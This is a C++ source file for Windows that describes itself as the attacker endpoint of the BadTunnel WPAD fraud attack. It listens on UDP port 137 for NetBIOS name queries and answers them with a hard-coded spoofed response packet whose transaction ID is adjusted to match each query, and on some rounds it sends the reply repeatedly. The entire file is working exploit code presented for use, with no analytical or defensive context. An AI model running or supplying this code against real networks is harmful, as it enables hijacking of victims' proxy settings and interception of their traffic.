// badtunnel.cpp : Defines the entry point for the console application.
//

/*
BadTunnel Attacker Endpoint to listen and reply the message to victim to implement the Wpad fraud attack.
WalterJia ( jiayanhui2877@gmail.com )
*/
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<stdio.h>
#include<winsock2.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define BUFLEN 512  //Max length of buffer
#define PORT 137   //The port on which to listen for incoming data

int i = 1;


char attack_pkt[] = { /* Packet 393 */
	0x96, 0x54, 0x85, 0x00, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x20, 0x46, 0x48, 0x46,
	0x41, 0x45, 0x42, 0x45, 0x45, 0x43, 0x41, 0x43,
	0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43,
	0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43,
	0x41, 0x43, 0x41, 0x43, 0x41, 0x00, 0x00, 0x20,
	0x00, 0x01, 0x00, 0x04, 0x93, 0xe0, 0x00, 0x06,
	0x00, 0x00, 0x0a, 0x65, 0x02, 0x11 };

int main()
{
    SOCKET s;
	struct sockaddr_in server, si_other;
	int slen, recv_len;
	char buf[BUFLEN];
	char bufSplit[BUFLEN];
	WSADATA wsa;

	slen = sizeof(si_other);

	//Initialise winsock
	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		exit(EXIT_FAILURE);
	}
	printf("Initialised.\n");

	//Create a socket
	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}
	printf("Socket created.\n");

	//Prepare the sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(PORT);

	//Bind
	if (bind(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
	{
		printf("Bind failed with error code : %d", WSAGetLastError());
		exit(EXIT_FAILURE);
	}
	puts("Bind done");

	//keep listening for data
	while (1)
	{
		printf("Waiting for data...\n");
		fflush(stdout);

		//clear the buffer by filling null, it might have previously received data
		memset(buf, '\0', BUFLEN);
		//memset(bufSplit, '\0', BUFLEN);
		

		//try to receive some data, this is a blocking call
		if ((recv_len = recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *) &si_other, &slen)) == SOCKET_ERROR)
		{
			printf("recvfrom() failed with error code : %d", WSAGetLastError());
			exit(EXIT_FAILURE);
		}

		if (recv_len < 48 || *(unsigned short *)(buf + 46) != 0x2100)
		{
			continue;
		}
		//print details of the client/peer and the data received
		printf("Received packet from %s:%d\n", inet_ntoa(si_other.sin_addr), ntohs(si_other.sin_port));
		printf("Data: %s\n", buf);

		//now reply the client with the same data
		*(unsigned short *)attack_pkt = htons((ntohs(*(unsigned short*)(buf)) + 2));
		recv_len = sizeof(attack_pkt);		
	
		int j = 0;
		if (i == 3)
		{
			/*
			sendto(s, attack_pkt, 10, 0, (struct sockaddr*) &si_other, slen);
			sendto(s, attack_pkt + 10, 10, 0, (struct sockaddr*) &si_other, slen);
			sendto(s, attack_pkt + 20, 10, 0, (struct sockaddr*) &si_other, slen);
			sendto(s, attack_pkt + 30, 10, 0, (struct sockaddr*) &si_other, slen);
			sendto(s, attack_pkt + 40, recv_len - 40, 0, (struct sockaddr*) &si_other, slen);
			*/
			Sleep(7000);
			printf("send packet loop!--------\n");
			while (j < 10)
			{
				printf("send packet loop inner!--------\n");
				sendto(s, attack_pkt, recv_len, 0, (struct sockaddr*) &si_other, slen);
				j++;
			}
			i = 0;
		}
		else
		{
			if (sendto(s, attack_pkt, recv_len, 0, (struct sockaddr*) &si_other, slen) == SOCKET_ERROR)
			{
				printf("sendto() failed with error code : %d", WSAGetLastError());
				exit(EXIT_FAILURE);
			}
		}

		i++;
	}

	closesocket(s);
	WSACleanup();

    return 0;
}

